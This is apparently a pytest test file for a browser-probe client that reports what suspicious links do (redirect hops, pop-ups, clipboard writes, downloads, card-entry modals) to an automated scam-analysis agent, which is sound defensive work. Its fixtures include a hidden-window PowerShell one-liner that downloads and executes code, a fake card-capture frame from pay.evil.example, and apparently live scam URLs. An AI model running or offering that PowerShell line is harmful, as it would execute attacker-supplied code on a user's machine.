"""The probe client turns the browser's record into observations the model
reads as facts. What a click did must survive the trip verbatim; a dead
probe is an absent render, never an exception into the agent loop."""

from __future__ import annotations

import base64
from types import SimpleNamespace
from unittest.mock import AsyncMock

import pytest

from infrastructure.browser_probe import BrowserProbeClient, format_observations


def _body(**over) -> dict:
    base = {
        "url": "https://ourl.jp/EJTQX",
        "landed_url": "https://aceuimg.pages.dev/",
        "final_url": "https://aceuimg.pages.dev/",
        "hops": ["https://ourl.jp/EJTQX", "https://aceuimg.pages.dev/"],
        "auto_redirects": [],
        "clicks": [],
        "popups": [],
        "downloads": [],
        "dialogs": [],
        "events": [],
        "blocked_requests": [],
        "html": "<title>Watch</title>",
        "screenshot": base64.b64encode(b"\xff\xd8\xffjpeg").decode(),
        "screenshot_after": "",
        "screenshot_type": "image/jpeg",
    }
    base.update(over)
    return base


class TestFormatObservations:
    def test_popup_is_named_with_its_cross_domain_url(self):
        text = format_observations(
            _body(
                clicks=[
                    {
                        "target": "video 'Click to Play'",
                        "popups": ["https://iserinekugel.com/ikq/141690"],
                        "navigated_to": None,
                        "downloads": [],
                        "dialogs": [],
                        "events": [],
                    }
                ]
            )
        )
        assert (
            "click 1: video 'Click to Play' → opened pop-up https://iserinekugel.com/ikq/141690 [cross-domain]"
            in text
        )
        assert (
            "loaded: https://ourl.jp/EJTQX → https://aceuimg.pages.dev/ (1 HTTP redirect hops)"
            in text
        )

    def test_meta_refresh_landing_is_shown_after_the_http_hops(self):
        text = format_observations(
            _body(
                hops=["https://ourl.jp/EJTQX", "https://ourl.jp/go.php?to=x"],
                landed_url="https://aceuimg.pages.dev/",
            )
        )
        assert (
            "loaded: https://ourl.jp/EJTQX → https://ourl.jp/go.php?to=x (1 HTTP redirect hops)"
            " → landed on https://aceuimg.pages.dev/ [cross-domain] (JS or meta refresh)"
        ) in text

    def test_auto_redirect_after_load_is_reported(self):
        text = format_observations(_body(auto_redirects=["https://t.me/s/chan"]))
        assert (
            "after load: redirected on its own to https://t.me/s/chan [cross-domain]"
            in text
        )

    def test_clipboard_write_is_shouted(self):
        text = format_observations(
            _body(
                clicks=[
                    {
                        "target": "button 'I'm not a robot'",
                        "popups": [],
                        "navigated_to": None,
                        "downloads": [],
                        "dialogs": [],
                        "events": [
                            ["clipboard_write", "powershell -w hidden -c iwr x|iex"]
                        ],
                    }
                ],
                events=[["clipboard_write", "powershell -w hidden -c iwr x|iex"]],
            )
        )
        assert "WROTE TO CLIPBOARD: 'powershell -w hidden -c iwr x|iex'" in text
        assert "clipboard writes: 'powershell" in text

    def test_silence_is_stated_not_omitted(self):
        text = format_observations(_body())
        assert "after load: stayed on the page" in text
        assert "clicks: no visible clickable control found" in text
        assert "clipboard writes: none" in text
        assert "notification permission prompt: not requested" in text
        assert "downloads: none" in text

    def test_modal_revealed_by_a_click_is_reported(self):
        text = format_observations(
            _body(
                clicks=[
                    {
                        "target": "a 'Verify Account button'",
                        "popups": [],
                        "navigated_to": None,
                        "downloads": [],
                        "dialogs": [],
                        "events": [],
                        "revealed": {
                            "text": [
                                "Add bank card",
                                "All operations comply with PCI DSS",
                            ],
                            "inputs": ["tel:cardnumber", "text:expiry", "tel:cvv"],
                            "frames": ["https://pay.evil.example/frame"],
                        },
                    }
                ]
            )
        )
        assert (
            "revealed on the page: 'Add bank card' | 'All operations comply with PCI DSS'"
            in text
        )
        assert "new form fields: tel:cardnumber, text:expiry, tel:cvv" in text
        assert "new frames from: pay.evil.example" in text
        assert "nothing observable" not in text

    def test_click_with_no_effect_says_so(self):
        text = format_observations(
            _body(
                clicks=[
                    {
                        "target": "button 'Continue Watching'",
                        "popups": [],
                        "navigated_to": None,
                        "downloads": [],
                        "dialogs": [],
                        "events": [],
                    }
                ]
            )
        )
        assert (
            "click 1: button 'Continue Watching' → nothing observable, stayed on page"
            in text
        )


class TestBrowserProbeClient:
    @pytest.mark.asyncio
    async def test_unconfigured_is_none(self):
        client = BrowserProbeClient(AsyncMock(), base_url="")
        assert await client.probe("https://x.example") is None

    @pytest.mark.asyncio
    async def test_decodes_shots_and_carries_observations(self):
        http = AsyncMock()
        http.post = AsyncMock(
            return_value=SimpleNamespace(
                raise_for_status=lambda: None, json=lambda: _body()
            )
        )
        client = BrowserProbeClient(http, base_url="http://browser:8011/")
        result = await client.probe("https://ourl.jp/EJTQX")
        assert result is not None
        assert result.screenshot == b"\xff\xd8\xffjpeg"
        assert result.media_type == "image/jpeg"
        assert result.final_url == "https://aceuimg.pages.dev/"
        assert (
            "loaded: https://ourl.jp/EJTQX → https://aceuimg.pages.dev/"
            in result.observations
        )
        assert http.post.await_args.args[0] == "http://browser:8011/probe"

    @pytest.mark.asyncio
    async def test_failure_is_none_not_raise(self):
        http = AsyncMock()
        http.post = AsyncMock(side_effect=RuntimeError("boom"))
        client = BrowserProbeClient(http, base_url="http://browser:8011")
        assert await client.probe("https://x.example") is None

    @pytest.mark.asyncio
    async def test_empty_render_is_none(self):
        http = AsyncMock()
        http.post = AsyncMock(
            return_value=SimpleNamespace(
                raise_for_status=lambda: None,
                json=lambda: _body(html="", screenshot=""),
            )
        )
        client = BrowserProbeClient(http, base_url="http://browser:8011")
        assert await client.probe("https://x.example") is None


class TestObservationFallbacks:
    def test_missing_fields_still_render_every_line(self):
        text = format_observations({"url": "https://x.example/"})
        assert "loaded: https://x.example/" in text
        assert "after load: stayed on the page" in text
        assert "clicks: no visible clickable control found" in text
        assert "final page: https://x.example/" in text

    def test_downloads_dialogs_and_blocked_requests_are_listed(self):
        text = format_observations(
            _body(
                downloads=["evil.exe from https://x.example/e"],
                dialogs=["alert: pay now"],
                blocked_requests=["http://10.0.0.1/"],
                clicks=[
                    {
                        "target": "a 'get'",
                        "popups": [],
                        "navigated_to": None,
                        "downloads": ["evil.exe from https://x.example/e"],
                        "dialogs": ["alert: pay now"],
                        "events": [
                            ["notification_prompt", "x"],
                            ["click_failed", "Timeout"],
                        ],
                    }
                ],
                events=[["notification_prompt", "x"]],
            )
        )
        assert "started download evil.exe" in text
        assert "dialog alert: pay now" in text
        assert "asked for notification permission" in text
        assert "click failed" in text
        assert "notification permission prompt: requested" in text
        assert "downloads: evil.exe from https://x.example/e" in text
        assert "dialogs: alert: pay now" in text
        assert "requests to private addresses refused: 1" in text

    def test_probe_note_when_controls_could_not_be_enumerated(self):
        text = format_observations(_body(events=[["candidates_failed", "Error: boom"]]))
        assert "probe note: could not enumerate controls (Error: boom)" in text


class TestB64:
    def test_garbage_decodes_to_empty(self):
        from infrastructure.browser_probe import _b64

        assert _b64("not base64!!") == b""
        assert _b64(None) == b""
